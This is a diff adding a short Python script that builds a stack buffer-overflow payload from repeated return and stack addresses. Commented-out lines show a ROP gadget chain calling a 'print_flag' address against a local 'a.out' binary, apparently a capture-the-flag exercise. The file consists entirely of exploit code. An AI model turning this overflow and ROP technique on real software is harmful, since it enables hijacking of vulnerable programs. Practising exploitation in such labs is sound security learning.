@@ -1,0 +1,38 @@
+#!/usr/bin/python
+
+import os
+import struct
+
+stack = 0xffffc009
+ret = 0x080488B5 # where you wana jump
+
+payload = ""
+for i in range(1250):
+    payload += struct.pack("I", ret)
+for i in range(50):
+    payload += struct.pack("I", stack)
+
+print("%s" % payload)
+
+# Addresses
+#pop_ret = 0x080b4eab
+#print_flag = 0x080488e0
+
+# Overflow
+#payload = "A"*0x6c
+#payload += "BBBB"
+#payload += struct.pack("I", 0xd)
+
+
+# Gadget
+#payload += struct.pack("I", print_flag)
+#payload += struct.pack("I", 0xd)
+#payload += struct.pack("I", pop_ret)
+#payload += struct.pack("<L", 0x0000000d)
+#payload += struct.pack('d', 15) # will be 0x1
+
+#print(payload)
+
+#payload += struct.pack("I", 0x080489c7)
+#os.system("a.out %s" % payload)
+#print(payload)
